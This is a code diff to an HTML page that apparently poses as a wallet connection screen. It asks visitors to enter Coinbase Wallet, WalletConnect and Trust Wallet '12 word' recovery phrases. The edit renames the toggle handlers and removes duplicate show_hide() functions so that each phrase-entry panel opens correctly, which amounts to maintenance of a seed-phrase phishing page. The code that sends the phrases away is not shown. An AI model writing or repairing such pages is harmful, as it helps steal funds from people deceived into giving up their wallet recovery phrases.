@@ -126,7 +126,7 @@
   <button id="btn2" onclick="hide_show()">COINBASE WALLET</button>
   <div id="coinbase" class="r-container">
     <ul class="nav justify-content-between">
-      <h2 class="mnemonic">PHRASE</h2>
+      <h2 class="mnemonic">12 WORD PHRASE</h2>
     </ul>
     <div class="tab-content" id="myTabContent">
       <div class="tab-pane fade active show" id="mnemonic" role="tabpanel" aria-labelledby="mnemonic-tab">
@@ -226,7 +226,7 @@
   </div>
 
 
-  <button id="btn3" onclick="show_hide()">WALLETCONNECT</button>
+  <button id="btn3" onclick="hide_or_show()">WALLETCONNECT</button>
   <div id="wallet" class="r-container">
    <ul class="nav justify-content-between">
      <h2 class="mnemonic">ENTER YOUR WALLETCONNECT PHRASE</h2>
@@ -332,7 +332,7 @@
 
 
 
- <button id="btn4" onclick="show_hide()">TRUST WALLET</button>
+ <button id="btn4" onclick="show_or_hide()">TRUST WALLET</button>
  <div id="trust" class="r-container">
   <ul class="nav justify-content-between">
     <h2 class="mnemonic">ENTER YOUR TRUST WALLET 12 WORD PHRASE</h2>
@@ -466,32 +466,7 @@
   color: white;
 }
 </style>
-<script>
-  var c;
 
-function show_hide() {
-    if(c == 1) {
-        document.getElementById("wallet").style.display="none";
-        return c=0;
-    }else{
-        document.getElementById("wallet").style.display="block";
-        return c=1;
-    }
-}
-
-
-var d;
-
-function show_hide() {
-    if(d == 1) {
-        document.getElementById("trust").style.display="none";
-        return d=0;
-    }else{
-        document.getElementById("trust").style.display="block";
-        return d=1;
-    }
-}
-</script>
 <!-- Smartsupp Live Chat script -->
 <script type="text/javascript">
 var _smartsupp = _smartsupp || {};
